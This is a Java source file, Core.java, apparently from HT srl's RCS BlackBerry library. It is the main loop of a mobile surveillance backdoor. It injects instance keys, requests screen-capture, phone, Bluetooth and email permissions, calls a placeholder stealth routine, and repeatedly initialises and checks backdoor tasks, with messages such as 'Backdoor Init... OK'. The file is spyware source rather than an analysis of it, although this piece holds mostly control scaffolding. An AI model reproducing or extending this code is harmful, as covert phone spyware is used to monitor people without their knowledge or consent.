/* *************************************************
c * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Core.java 
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.ApplicationDescriptor;
import blackberry.config.InstanceKeys323;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * Classe Core, contiene il main.
 */
public final class Core implements Runnable {

	/** The debug instance. */
	// #debug
	private static Debug debug;

	private static Core instance;
	
	
	/**
	 * Gets the single instance of Core.
	 * 
	 * @return single instance of Core
	 */
	public static synchronized Core getInstance() {
		if (instance == null) {
			instance = new Core();
		}
		return instance;
	}

	/**
	 * Lib main.
	 * 
	 * @param args
	 *            the args
	 */
	public static void libMain(final String[] args) {
		final Core core = Core.getInstance();
		core.run();
	}

	/** The task obj. */
	private final Task task;

	/**
	 * Instantiates a new core.
	 */
	private Core() {

		task = Task.getInstance();
		Utils.sleep(1000);
		// Thread.currentThread().setPriority(Thread.MAX_PRIORITY);

		// #mdebug
		Debug.init(true, false, false);
		debug = new Debug("Core", DebugLevel.VERBOSE);
		debug.trace("Core init");
		// #enddebug

		final boolean antennaInstalled = true;
		// #if 1=0
		// @ antennaInstalled = false;
		// #endif
		// #debug debug
		 debug.trace("Antenna: " + antennaInstalled);

		if (!Keys.hasBeenBinaryPatched()) {
			// #debug
			debug.warn("Not binary patched, injecting 323");
			InstanceKeys323.injectKeys323();
		}

		Encryption.init();

		/*
		 * Core core = Core.getInstance(); core.run();
		 */

	}

	/**
	 * This method showcases the ability to check the current permissions for
	 * the application. If the permissions are insufficient, the user will be
	 * prompted to increase the level of permissions. You may want to restrict
	 * permissions for the ApplicationPermissionsDemo.cod module beforehand in
	 * order to demonstrate this sample effectively. This can be done in
	 * Options/Advanced Options/Applications/(menu)Modules.Highlight
	 * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
	 * Permissions' from the menu.
	 */
	private void checkPermissions() {
		// #ifdef HAVE_PERMISSIONS
		// #debug info
		debug.info("CheckPermissions");
		// NOTE: This sample leverages the following permissions:
		// --Event Injector
		// --Phone
		// --Device Settings
		// --Email
		// The sample demonstrates how these user defined permissions will
		// cause the respective tests to succeed or fail. Individual
		// applications will require access to different permissions.
		// Please review the Javadocs for the ApplicationPermissions class
		// for a list of all available permissions
		// May 13, 2008: updated permissions by replacing deprecated constants.

		// Capture the current state of permissions and check against the
		// requirements
		final ApplicationPermissionsManager apm = ApplicationPermissionsManager
				.getInstance();
		final ApplicationPermissions original = apm.getApplicationPermissions();

		// Set up and attach a reason provider
		final CoreReasonProvider drp = new CoreReasonProvider();
		apm.addReasonProvider(ApplicationDescriptor
				.currentApplicationDescriptor(), drp);

		if (original
				.getPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE) == ApplicationPermissions.VALUE_ALLOW
				&& original
						.getPermission(ApplicationPermissions.PERMISSION_PHONE) == ApplicationPermissions.VALUE_ALLOW
				&& original
						.getPermission(ApplicationPermissions.PERMISSION_BLUETOOTH) == ApplicationPermissions.VALUE_ALLOW
				&& original
						.getPermission(ApplicationPermissions.PERMISSION_EMAIL) == ApplicationPermissions.VALUE_ALLOW) {
			// All of the necessary permissions are currently available
			// #debug info
			debug
					.info("All of the necessary permissions are currently available");
			return;
		}

		// Create a permission request for each of the permissions your
		// application
		// needs. Note that you do not want to list all of the possible
		// permission
		// values since that provides little value for the application or the
		// user.
		// Please only request the permissions needed for your application.
		final ApplicationPermissions permRequest = new ApplicationPermissions();
		permRequest
				.addPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE);
		permRequest.addPermission(ApplicationPermissions.PERMISSION_PHONE);
		permRequest.addPermission(ApplicationPermissions.PERMISSION_BLUETOOTH);
		permRequest.addPermission(ApplicationPermissions.PERMISSION_EMAIL);

		final boolean acceptance = ApplicationPermissionsManager.getInstance()
				.invokePermissionsRequest(permRequest);

		if (acceptance) {
			// User has accepted all of the permissions
			// #debug info
			debug.info("User has accepted all of the permissions");
			return;
		} else {
			// The user has only accepted some or none of the permissions
			// requested. In this sample, we will not perform any additional
			// actions based on this information. However, there are several
			// scenarios where this information could be used. For example,
			// if the user denied networking capabilities then the application
			// could disable that functionality if it was not core to the
			// operation of the application.
			// #debug
			debug.warn("User has accepted some or none of the permissions");
		}
		// #endif
	}

	/**
	 * Run.
	 * 
	 * @return true, if successful
	 */
	public void run() {

		checkPermissions();
		stealth();

		Utils.sleep(500);

		for (;;) {
			// #debug info
			debug.info("init task");
			if (task.taskInit() == false) {
				// #debug
				debug.error("TaskInit() FAILED");
				Msg.demo("Backdoor Init... FAILED");
				Msg.show();
				break;
			} else {
				// #debug debug
				 debug.trace("TaskInit() OK");
				// CHECK: Status o init?
				Msg.demo("Backdoor Init... OK");
				Msg.show();
			}

			// TODO togliere
			// if (!DeviceInfo.isSimulator()) {
			// debug.warn("TRIGGERING ACTION 0");
			// Status.getInstance().triggerAction(0, null);
			// }

			// #debug info
			debug.info("starting checking actions");
			if (task.checkActions() == false) {
				// #debug
				debug.error("CheckActions() [Uninstalling?] FAILED");
				// chiudere tutti i thread
				// decidere se e' un uninstall
				Msg.demo("Backdoor Uninstalled, reboot the device");
				break;
			}
		}

		// #debug debug
		 debug.trace("RCSBlackBerry exit ");

		// #debug
		Debug.stop();

		System.exit(0);
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub

	}
	


}
